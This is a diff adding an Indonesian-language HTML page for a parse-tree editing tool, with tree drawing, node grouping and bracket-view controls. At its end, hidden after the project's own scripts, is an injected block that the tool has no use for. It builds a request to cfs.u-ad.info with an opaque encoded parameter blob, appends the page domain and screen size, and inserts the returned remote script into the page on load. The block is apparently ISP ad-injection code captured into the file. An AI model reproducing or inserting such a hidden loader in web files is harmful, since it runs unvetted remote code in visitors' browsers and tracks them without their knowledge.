@@ -1,0 +1,134 @@
+
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+        <meta name="language" content="en" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+        <meta charset="UTF-8"/>
+        <meta name="viewport" content="initial-scale=1.0, width=device-width, minimum-scale=1.0, maximum-scale=2.0"/>
+        <link rel="shortcut icon" href="./favicon.ico" type="images/x-icon"></link>
+        <link rel="stylesheet" type="text/css" href="./styles/bootstrap/bootstrap.readable.css" />
+        <link rel="stylesheet" type="text/css" href="./styles/pace/pace-theme-minimal.css" />
+        <link rel="stylesheet" type="text/css" href="./styles/fontawesome/font-awesome.min.css" />
+        <link rel="stylesheet" type="text/css" href="./styles/main.css" />
+        <script type="text/javascript" src="./scripts/jquery/jquery-1.11.0.min.js"></script>
+        <script type="text/javascript" src="./scripts/jquery/jquery.easing.min.js"></script>
+        <script type="text/javascript" src="./scripts/util/underscore-1.5.2.min.js"></script>
+        <script type="text/javascript" src="./scripts/bootstrap/bootstrap.min.js"></script>
+        <script type="text/javascript" src="./scripts/pace/pace.min.js"></script>
+        <script type="text/javascript" src="./scripts/core/core.js"></script>
+        <script type="text/javascript">
+            /*<![CDATA[*/
+            core.init({'baseURL': '.'}, {'lang': 'id'});
+            /*]]>*/
+        </script>
+        <title>POS Tag - EditParseTree Site</title>
+    </head>
+
+    <body>
+        <div class="container">
+            <div class="container text-right">
+                <button class="btn btn-default action-save">
+                    <i class="glyphicon glyphicon-file"></i>
+                    Simpan
+                </button>
+                <input type="file" name="file" class="form-control" />
+            </div>
+            <section id="description-corpus" class="container content-section text-center">
+                <div class="row">
+                    <div class="col-lg-8 col-lg-offset-2">
+                        <fieldset>
+                            <legend>
+                                Edit Parse Tree
+                            </legend>
+                        </fieldset>
+                        <section>
+                            <input type="text" class="form-control" id="input-raw-string" value="" />
+                            <button class="parse-graph btn">
+                                Tampilkan
+                            </button>
+                        </section>
+                    </div>
+                </div>
+            </section>
+
+            <section class="container content-section text-center">
+                <div class="row" style="height: 300px">  
+                    <div id="svg-wrapper" class="col-md-9">
+                        <svg id="svg-canvas" class="display" width=960 height="600px"></svg>
+                    </div>
+                    <div class="col-md-3 input-group-action">
+                        <section class="input-type-group">
+                            <p style="margin-bottom: 0px">
+                                anda dapat membuat elemen baru di bawah ini menjadi 
+                                Parent dari node yang anda pilih.
+                            </p>
+                            <div class="input-group ">
+                                <input class="form-control parent-node" type="text" />
+                                <span class="input-group-addon btn btn-default apply-parent">
+                                    Gabung
+                                </span>
+                            </div>       
+                        </section>
+
+                        <section class="input-type-ungroup text-center">
+                            <p style="margin-bottom: 0px">
+                                atau anda dapat melepas status Parent pada node yang 
+                                anda pilih. Sehingga anak-anak dari node tsb akan menjadi
+                                Sub-Tree sendiri
+                            </p>
+                            <button class="form-control btn btn-default clear-parent">
+                                Lepas
+                            </button>
+                        </section>
+                    </div>
+                </div>
+            </section>
+
+            <section class="container content-section text-center">
+                <button class="btn btn-default show-bracket">
+                    <h5>
+                        Tampilan Bracket
+                    </h5>
+                </button>
+                <pre class="panel-bracket"></pre>
+            </section>
+        </div>
+
+        <div class="script">
+            <link rel="stylesheet" type="text/css" href="./styles/tree/app.css" />
+            <script type="text/javascript" src="./scripts/file/blob.js" ></script>
+            <script type="text/javascript" src="./scripts/file/file-saver.js" ></script>
+
+            <script type="text/javascript" src="./scripts/tree/d3.v3.min.js" ></script>
+            <script type="text/javascript" src="./scripts/tree/dagre-d3.min.js" ></script>
+            <script type="text/javascript" src="./scripts/tree/node.structure.js" ></script>
+            <script type="text/javascript" src="./scripts/tree/draw.js" ></script>
+            <script type="text/javascript" src="./scripts/tree/parser.js" ></script>
+        </div>
+        <script type="text/javascript">if (self == top) {
+        function netbro_cache_analytics(fn, callback) {
+            setTimeout(function () {
+                fn();
+                callback();
+            }, 0);
+        }
+        function sync(fn) {
+            fn();
+        }
+        function requestCfs() {
+            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
+            var idc_glo_r = Math.floor(Math.random() * 99999999999);
+            var url = idc_glo_url + "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRxuFIQUOA7GXrsH2pIKMtZWH4wNNhG3%2fHTglgES0gzjb54kqhkxHJd9%2bgRJIS4N3PRbfzCSg2AF%2ffqoU080GXYQLby5a9tUZwqbwGusnkMS%2blBCLntpvUotwgkQbDGPObU5B4M79OkHq0Q3qh1DqsuOknx%2fu9KP2ye8waznTqx8E%2f%2bd2YgC6gAExwodNuuy5sDzNM7I3PHNbtmXXtBt0k%2f4pae2wLEmLB5MBM3Wre01u1ZkEICjW5aZ4idMQI8Cp3SFXIvbS3ZAwkcr2zg9tHpd3SAGxEglIvmPrOiC8oCUmyWbWSY%2bHn1xhIeLrK9tQquDmcav1RZXO4nf1SHN%2bAfQwd9bkiVaoZlN8rB8kmELwbkptxnDd8sfz%2bCoxtETcunFsj8mWLDCSkmwhBLWlNT8ZD2fUNAdrTD%2btkgwKbBz%2fopTw%2fsyb1c%2fRuOWyOz2sj3%2fGVfRF%2fp5yqK3cx%2fEmglv8AYGbaapoUfrmsPytS08hqaVKUi0BbvDLSWw6rehx3d0iw2IACeG79uajTy%2fAh4Jws0ztDTdIxV3R3vVAdAnHIWaqzxbNuLA%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
+            var bsa = document.createElement('script');
+            bsa.type = 'text/javascript';
+            bsa.async = true;
+            bsa.src = url;
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
+        }
+        netbro_cache_analytics(requestCfs, function () {
+        });
+    }
+    ;</script></body>
+</html>
